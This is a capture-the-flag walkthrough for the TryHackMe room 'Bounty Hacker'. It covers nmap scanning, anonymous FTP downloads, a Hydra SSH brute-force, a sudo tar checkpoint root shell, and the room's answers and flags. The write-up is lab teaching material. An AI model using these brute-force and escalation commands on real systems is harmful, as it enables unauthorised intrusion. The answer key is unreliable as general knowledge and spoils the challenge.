# TryHackMe: Bounty Hacker

**Difficulty:** Easy  
**Platform:** TryHackMe  
**Category:** Linux / Network & Privilege Escalation  

---

## Overview & Attack Path
1. **Reconnaissance:** Port scanning to identify open services (FTP, SSH, HTTP).
2. **FTP Enumeration:** Anonymous FTP access revealed a task list (`task.txt`) and a password wordlist (`locks.txt`).
3. **SSH Brute-Force:** Used Hydra with username `lin` and the `locks.txt` wordlist to obtain the SSH password.
4. **User Flag:** Logged in via SSH as user `lin` and retrieved `user.txt`.
5. **Privilege Escalation:** Exploited `sudo /bin/tar` wildcard/checkpoint capability (GTFOBins) to spawn an instant root shell and capture `root.txt`.

---

## Step 1: Reconnaissance (Nmap)

Run an initial port scan to discover open ports and running services on the target:

```bash
nmap -sC -sV -Pn <TARGET_IP>
```

### Scan Results:
* **Port 21 (FTP):** `vsftpd 3.0.3` (Anonymous FTP login allowed)
* **Port 22 (SSH):** `OpenSSH 7.2p2 Ubuntu`
* **Port 80 (HTTP):** `Apache httpd 2.4.18`

---

## Step 2: Anonymous FTP Enumeration

Since anonymous access is permitted on FTP port 21, connect directly:

```bash
ftp <TARGET_IP>
```

* **Username:** `anonymous`
* **Password:** *(press Enter or leave blank)*

```text
Connected to <TARGET_IP>.
220 (vsFTPd 3.0.3)
Name (<TARGET_IP>): anonymous
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> pass
Passive mode: on.
ftp> ls
-rw-r--r--    1 0        0             26 Jun 07  2020 locks.txt
-rw-r--r--    1 0        0            147 Jun 07  2020 task.txt
ftp> mget *
ftp> exit
```

### Inspecting the Downloaded Files

1. **`task.txt`**:
   ```text
   1. Protect Vicious.
   2. Plan for spice payout.
   3. Check the locks.
   -- lin
   ```
   > **Note:** The note is signed by `-- lin`, giving us a potential valid username: **`lin`**.

2. **`locks.txt`**:
   ```text
   rEddragon
   Reddr4gonSynd1cat3
   california
   ...
   ```
   > **Note:** This contains a custom list of passwords that can be used for dictionary attacks against the `lin` account.

---

## Step 3: SSH Password Brute-Forcing (Hydra)

With the username `lin` and the password list `locks.txt`, use **Hydra** to brute-force the SSH service:

```bash
hydra -l lin -P locks.txt ssh://<TARGET_IP>
```

### Hydra Output:
```text
[22][ssh] host: <TARGET_IP>   login: lin   password: RedDr4gonSynd1cat3
1 of 1 target successfully completed, 1 valid password found
```

* **Username:** `lin`
* **Password:** `RedDr4gonSynd1cat3`

---

## Step 4: User Flag

Log into the target machine via SSH:

```bash
ssh lin@<TARGET_IP>
```
*Enter password:* `RedDr4gonSynd1cat3`

Once authenticated, locate and read the user flag on the Desktop:

```bash
cat ~/Desktop/user.txt
```

> **User Flag:** `THM{CR1M3_SyNd1C4T3}`

---

## Step 5: Privilege Escalation (Root)

### 1. Check Sudo Privileges
Inspect the commands that the user `lin` can run with elevated privileges:

```bash
sudo -l
```

**Output:**
```text
Matching Defaults entries for lin on ip-10-49-149-230:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User lin may run the following commands on ip-10-49-149-230:
    (root) /bin/tar
```

`lin` can run `/bin/tar` as `root` with `sudo`.

---

### 2. Exploiting `tar` via GTFOBins
The GNU `tar` binary supports checkpoint actions, allowing command execution upon reaching a checkpoint when creating an archive.

Execute the following command to spawn a root shell:

```bash
sudo tar cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
```

You are immediately dropped into a root shell:

```bash
# whoami
root

# id
uid=0(root) gid=0(root) groups=0(root)
```

---

## Step 6: Root Flag

Navigate to the `/root` directory and retrieve the root flag:

```bash
cat /root/root.txt
```

> **Root Flag:** `THM{80UN7Y_h4cK3r}`

---

## Summary of Answers

| Task / Question | Answer |
| :--- | :--- |
| **Who wrote the task list?** | `lin` |
| **What service can you brute force with the text file found?** | `SSH` |
| **What is the user's password?** | `RedDr4gonSynd1cat3` |
| **User Flag (`user.txt`)** | `THM{CR1M3_SyNd1C4T3}` |
| **Root Flag (`root.txt`)** | `THM{80UN7Y_h4cK3r}` |
